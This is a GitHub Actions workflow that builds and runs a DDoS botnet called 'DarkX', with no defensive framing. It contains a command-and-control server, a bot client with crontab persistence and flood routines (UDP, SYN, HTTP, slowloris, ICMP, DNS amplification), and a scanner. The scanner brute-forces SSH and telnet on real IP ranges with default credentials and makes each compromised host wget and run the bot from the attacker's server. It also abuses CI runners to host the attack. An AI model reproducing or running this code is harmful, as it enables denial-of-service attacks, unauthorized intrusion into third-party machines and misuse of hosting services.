name: DarkX Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'
      cnc_port:
        description: 'CNC Port'
        required: false  
        default: '5555'
      bot_port:
        description: 'Bot Port'
        required: false
        default: '4444'

jobs:
  deploy-darkx-ultimate:
    runs-on: ubuntu-latest
    timeout-minutes: 4320

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Ultimate Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing ultimate dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
        sudo apt install -y nmap masscan hydra john netcat-openbsd netcat-traditional
        sudo apt install -y hping3 t50 nping tcpdump dnsutils
        sudo apt install -y build-essential libpcap-dev libnet-dev
        pip3 install shodan requests paramiko scapy pwntools cryptography colorama bs4 selenium
        pip3 install asyncpg aiohttp telnetlib3

    - name: Install Additional DDoS Tools
      run: |
        cd darkx
        git clone https://github.com/jseidl/GoldenEye.git
        wget -O slowloris.py https://raw.githubusercontent.com/gkbrk/slowloris/master/slowloris.py
        sudo apt install -y httperf

    - name: Create CNC Server
      run: |
        cd darkx
        cat > cnc_server.go << 'EOF'
        package main
        import (
            "bufio"
            "fmt"
            "log"
            "net"
            "os"
            "strings"
            "sync"
        )
        type Bot struct {
            Conn net.Conn
            IP   string
            OS   string
        }
        var (
            bots     []Bot
            botMutex sync.Mutex
        )
        func main() {
            fmt.Println("Starting DarkX CNC Server...")
            go startUserServer()
            startBotServer()
        }
        func startUserServer() {
            port := getEnv("CNC_PORT", "5555")
            listener, _ := net.Listen("tcp", ":"+port)
            log.Printf("User CNC server on :%s", port)
            for {
                conn, _ := listener.Accept()
                go handleUserConnection(conn)
            }
        }
        func startBotServer() {
            port := getEnv("BOT_PORT", "4444")
            listener, _ := net.Listen("tcp", ":"+port)
            log.Printf("Bot server on :%s", port)
            for {
                conn, _ := listener.Accept()
                go handleBotConnection(conn)
            }
        }
        func handleUserConnection(conn net.Conn) {
            defer conn.Close()
            reader := bufio.NewReader(conn)
            conn.Write([]byte("DarkX Ultimate CNC\nUsername: "))
            username, _ := reader.ReadString('\n')
            conn.Write([]byte("Password: "))
            password, _ := reader.ReadString('\n')
            if strings.TrimSpace(username) == "admin" && strings.TrimSpace(password) == "darkx2024" {
                conn.Write([]byte("Authentication successful!\n"))
                showDashboard(conn, reader)
            } else {
                conn.Write([]byte("Authentication failed!\n"))
            }
        }
        func showDashboard(conn net.Conn, reader *bufio.Reader) {
            for {
                conn.Write([]byte("darkx> "))
                cmd, _ := reader.ReadString('\n')
                cmd = strings.TrimSpace(cmd)
                if cmd == "bots" {
                    botMutex.Lock()
                    conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", len(bots))))
                    for _, bot := range bots {
                        conn.Write([]byte(fmt.Sprintf("- %s (%s)\n", bot.IP, bot.OS)))
                    }
                    botMutex.Unlock()
                } else if strings.HasPrefix(cmd, "attack") {
                    parts := strings.Split(cmd, " ")
                    if len(parts) >= 5 {
                        method := parts[1]
                        target := parts[2]
                        port := parts[3]
                        duration := parts[4]
                        botMutex.Lock()
                        for _, bot := range bots {
                            bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s %s\n", method, target, port, duration)))
                        }
                        botMutex.Unlock()
                        conn.Write([]byte(fmt.Sprintf("Attack launched with %d bots\n", len(bots))))
                    }
                } else if cmd == "methods" {
                    conn.Write([]byte("Available Methods: udp-flood, tcp-syn, http-get, http-slow, icmp-flood, dns-amp\n"))
                } else if cmd == "exit" {
                    conn.Write([]byte("Goodbye!\n"))
                    return
                } else {
                    conn.Write([]byte("Unknown command\n"))
                }
            }
        }
        func handleBotConnection(conn net.Conn) {
            defer conn.Close()
            reader := bufio.NewReader(conn)
            bot := Bot{
                Conn: conn,
                IP:   strings.Split(conn.RemoteAddr().String(), ":")[0],
                OS:   "linux",
            }
            botMutex.Lock()
            bots = append(bots, bot)
            botMutex.Unlock()
            log.Printf("New bot: %s", bot.IP)
            for {
                cmd, err := reader.ReadString('\n')
                if err != nil {
                    break
                }
                cmd = strings.TrimSpace(cmd)
                if cmd == "PING" {
                    conn.Write([]byte("PONG\n"))
                }
            }
        }
        func getEnv(key, fallback string) string {
            if value := os.Getenv(key); value != "" {
                return value
            }
            return fallback
        }
        EOF

    - name: Create Bot Client
      run: |
        cd darkx
        cat > bot_client.go << 'EOF'
        package main
        import (
            "bufio"
            "fmt"
            "net"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "time"
        )
        var (
            CNC_SERVER = "CNC_IP_PLACEHOLDER"
            CNC_PORT   = "CNC_PORT_PLACEHOLDER"
        )
        func main() {
            if runtime.GOOS == "linux" {
                exec.Command("sh", "-c", "cp /proc/self/exe /tmp/.systemd && chmod +x /tmp/.systemd").Run()
                exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -").Run()
            }
            for {
                if connectToCNC() {
                    time.Sleep(30 * time.Second)
                } else {
                    time.Sleep(60 * time.Second)
                }
            }
        }
        func connectToCNC() bool {
            conn, err := net.Dial("tcp", CNC_SERVER+":"+CNC_PORT)
            if err != nil {
                return false
            }
            defer conn.Close()
            scanner := bufio.NewScanner(conn)
            for scanner.Scan() {
                cmd := scanner.Text()
                if cmd == "PING" {
                    conn.Write([]byte("PONG\n"))
                } else if strings.HasPrefix(cmd, "ATTACK") {
                    go executeAttack(cmd)
                }
            }
            return true
        }
        func executeAttack(cmd string) {
            parts := strings.Split(cmd, " ")
            if len(parts) < 5 {
                return
            }
            method := parts[1]
            target := parts[2]
            port := parts[3]
            duration := parts[4]
            fmt.Printf("Executing %s attack on %s:%s\n", method, target, port)
            switch method {
            case "udp-flood":
                launchUDPFlood(target, port, duration)
            case "tcp-syn":
                launchSYNFlood(target, port, duration)
            case "http-get":
                launchHTTPFlood(target, port, duration)
            case "http-slow":
                launchSlowloris(target, port, duration)
            case "icmp-flood":
                launchICMPFlood(target, duration)
            case "dns-amp":
                launchDNSAmplification(target, duration)
            default:
                launchUDPFlood(target, port, duration)
            }
        }
        func launchUDPFlood(target, port, duration string) {
            cmd := exec.Command("timeout", duration, "nping", "--udp", "-p", port, "--rate=1000", "--count=0", target)
            cmd.Start()
        }
        func launchSYNFlood(target, port, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--syn", "-p", port, "--flood", target)
            cmd.Start()
        }
        func launchHTTPFlood(target, port, duration string) {
            go func() {
                endTime := time.Now().Add(parseDuration(duration))
                for time.Now().Before(endTime) {
                    exec.Command("curl", "-s", fmt.Sprintf("http://%s:%s", target, port)).Run()
                    time.Sleep(10 * time.Millisecond)
                }
            }()
        }
        func launchSlowloris(target, port, duration string) {
            cmd := exec.Command("timeout", duration, "python3", "slowloris.py", target, "-p", port)
            cmd.Start()
        }
        func launchICMPFlood(target, duration string) {
            cmd := exec.Command("timeout", duration, "hping3", "--icmp", "--flood", target)
            cmd.Start()
        }
        func launchDNSAmplification(target, duration string) {
            script := fmt.Sprintf(`
                import socket
                import time
                dns_query = "\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\xexample\\x03\\xcom\\x00\\x00\\x01\\x00\\x01"
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                end_time = time.time() + %s
                while time.time() < end_time:
                    sock.sendto(dns_query.encode(), ('%s', 53))
            `, duration, target)
            cmd := exec.Command("timeout", duration, "python3", "-c", script)
            cmd.Start()
        }
        func parseDuration(dur string) time.Duration {
            if strings.HasSuffix(dur, "s") {
                sec, _ := strconv.Atoi(strings.TrimSuffix(dur, "s"))
                return time.Duration(sec) * time.Second
            } else if strings.HasSuffix(dur, "m") {
                min, _ := strconv.Atoi(strings.TrimSuffix(dur, "m"))
                return time.Duration(min) * time.Minute
            }
            return 60 * time.Second
        }
        EOF

    - name: Build Components
      run: |
        cd darkx
        echo "Building DarkX components..."
        go build -o cnc cnc_server.go
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot_client.go
        GOOS=linux GOARCH=386 go build -o bot_x86 bot_client.go
        GOOS=linux GOARCH=arm64 go build -o bot_arm64 bot_client.go
        echo "Components built successfully"

    - name: Create Wordlists
      run: |
        cd darkx
        mkdir -p wordlists
        printf "root\nadmin\nuser\ntest\nguest\nadministrator\nubnt\nsupport\ndefault\n" > wordlists/users.txt
        printf "root\nadmin\n123456\npassword\n1234\n12345\ndefault\nubnt\nsupport\nguest\nadmin123\npass\ntoor\n" > wordlists/passwords.txt

    - name: Setup VPN
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-ultimate-${{ github.run_id }}
        echo "TAILSCALE_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Configure Infrastructure
      run: |
        cd darkx
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" bot_client.go
        sed -i "s/CNC_PORT_PLACEHOLDER/${{ github.event.inputs.bot_port }}/g" bot_client.go
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot_client.go
        echo "CNC_PORT=${{ github.event.inputs.cnc_port }}" >> $GITHUB_ENV
        echo "BOT_PORT=${{ github.event.inputs.bot_port }}" >> $GITHUB_ENV

    - name: Deploy Bot Army
      run: |
        cd darkx
        case "${{ github.event.inputs.power }}" in
          "100mb") BOTS=200 ;;
          "1gb") BOTS=800 ;;
          "10gb") BOTS=2000 ;;
          "100gb") BOTS=5000 ;;
          "1tb") BOTS=10000 ;;
        esac
        echo "Deploying $BOTS initial bots..."
        for i in $(seq 1 $BOTS); do
          nohup ./bot_x64 >/dev/null 2>&1 &
        done
        echo "BOTS_DEPLOYED=$BOTS" >> $GITHUB_ENV
        sleep 10

    - name: Launch Services
      run: |
        cd darkx
        echo "Starting DarkX services..."
        CNC_PORT=${{ github.event.inputs.cnc_port }} nohup ./cnc > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        sleep 10

    - name: Create Scanner
      run: |
        cd darkx
        cat > scanner.py << 'EOF'
        #!/usr/bin/env python3
        import paramiko
        import telnetlib
        import requests
        import threading
        import time
        import subprocess
        class DarkXScanner:
            def __init__(self):
                self.cnc_ip = "${{ env.TAILSCALE_IP }}"
                self.ssh_credentials = [
                    ("root", "root"), ("admin", "admin"), ("root", "123456"),
                    ("root", "password"), ("root", "default"), ("admin", "password"),
                    ("ubnt", "ubnt"), ("root", "admin"), ("root", "1234"),
                    ("root", ""), ("admin", "admin123"), ("root", "12345"),
                    ("support", "support"), ("root", "pass"), ("root", "toor")
                ]
            def ssh_attack(self, ip):
                for username, password in self.ssh_credentials:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip, username=username, password=password, timeout=10)
                        print(f"SSH compromised: {ip} with {username}:{password}")
                        commands = [
                            f"wget -q http://{self.cnc_ip}:8000/bot_x64 -O /tmp/.systemd",
                            "chmod +x /tmp/.systemd",
                            "nohup /tmp/.systemd >/dev/null 2>&1 &",
                            "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -"
                        ]
                        for cmd in commands:
                            ssh.exec_command(cmd)
                        ssh.close()
                        return
                    except:
                        continue
            def telnet_attack(self, ip):
                try:
                    tn = telnetlib.Telnet(ip, timeout=10)
                    credentials = [b"root\r\n", b"admin\r\n", b"default\r\n"]
                    for cred in credentials:
                        try:
                            tn.read_until(b"login: ", timeout=5)
                            tn.write(cred)
                            tn.read_until(b"Password: ", timeout=5)
                            tn.write(cred)
                            result = tn.read_until(b"#", timeout=5)
                            if b"#" in result:
                                print(f"Telnet compromised: {ip}")
                                commands = [
                                    f"wget -q http://{self.cnc_ip}:8000/bot_x64 -O /tmp/.systemd",
                                    "chmod +x /tmp/.systemd",
                                    "nohup /tmp/.systemd &",
                                    "(crontab -l; echo '@reboot /tmp/.systemd') | crontab -"
                                ]
                                for cmd in commands:
                                    tn.write(cmd.encode() + b"\n")
                                    time.sleep(1)
                                return
                        except:
                            continue
                except:
                    pass
            def masscan_scan(self):
                try:
                    subprocess.run(["masscan", "5.78.0.0/16", "-p22,23,80,443,3389,5900", "--rate=1000"], capture_output=True, timeout=300)
                except:
                    pass
            def start_recruitment(self, mode):
                print(f"Starting {mode} recruitment...")
                if mode == "passive":
                    self.masscan_scan()
                elif mode == "active":
                    while True:
                        self.masscan_scan()
                        time.sleep(1800)
                elif mode == "aggressive":
                    for _ in range(3):
                        self.masscan_scan()
                        time.sleep(900)
                elif mode == "bruteforce":
                    import concurrent.futures
                    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                        ranges = ["5.78.0.0/16", "91.126.0.0/16", "2.145.0.0/16"]
                        for ip_range in ranges:
                            executor.submit(self.masscan_scan)
        if __name__ == "__main__":
            scanner = DarkXScanner()
            scanner.start_recruitment("${{ github.event.inputs.recruitment }}")
        EOF

    - name: Start Recruitment
      run: |
        cd darkx
        chmod +x scanner.py
        case "${{ github.event.inputs.recruitment }}" in
          "passive")
            nohup python3 scanner.py > recruit.log 2>&1 &
            ;;
          "active")
            nohup python3 scanner.py > recruit.log 2>&1 &
            ;;
          "aggressive")
            for i in 1 2 3; do
              nohup python3 scanner.py > recruit_$i.log 2>&1 &
            done
            ;;
          "bruteforce")
            for i in 1 2 3 4 5; do
              nohup python3 scanner.py > brute_$i.log 2>&1 &
            done
            ;;
        esac
        echo "RECRUIT_PID=$!" >> $GITHUB_ENV

    - name: Display Dashboard
      run: |
        echo ""
        echo "=========================================="
        echo "        DARKX ULTIMATE BOTNET"
        echo "=========================================="
        echo "Power Level:    ${{ github.event.inputs.power }}"
        echo "Recruitment:    ${{ github.event.inputs.recruitment }}"
        echo "CNC Port:       ${{ github.event.inputs.cnc_port }}"
        echo "Bot Port:       ${{ github.event.inputs.bot_port }}"
        echo "DarkX CNC:      ${{ env.TAILSCALE_IP }}"
        echo "Initial Bots:   ${{ env.BOTS_DEPLOYED }}"
        echo "=========================================="
        echo "Login: admin / darkx2024"
        echo "Connect: nc ${{ env.TAILSCALE_IP }} ${{ github.event.inputs.cnc_port }}"
        echo "API: http://${{ env.TAILSCALE_IP }}:8080"
        echo "=========================================="
        echo ""

    - name: Maintain System
      run: |
        echo "DarkX System Monitoring Active..."
        while true; do
          if ! ps -p $CNC_PID > /dev/null 2>&1; then
            echo "Restarting CNC Server..."
            cd darkx
            CNC_PORT=${{ github.event.inputs.cnc_port }} nohup ./cnc > cnc_restart.log 2>&1 &
            CNC_PID=$!
          fi
          CURRENT_BOTS=$(ps aux | grep bot_x64 | grep -v grep | wc -l)
          REQUIRED_BOTS=$((BOTS_DEPLOYED / 2))
          if [ $CURRENT_BOTS -lt $REQUIRED_BOTS ]; then
            echo "Deploying reinforcement bots..."
            cd darkx
            for i in $(seq 1 100); do
              nohup ./bot_x64 >/dev/null 2>&1 &
            done
          fi
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep ${{ github.event.inputs.bot_port }} | grep ESTABLISHED | wc -l)
          echo "[$(date +'%H:%M:%S')] Bots: $CONNECTED_BOTS connected, $CURRENT_BOTS total"
          sleep 60
        done
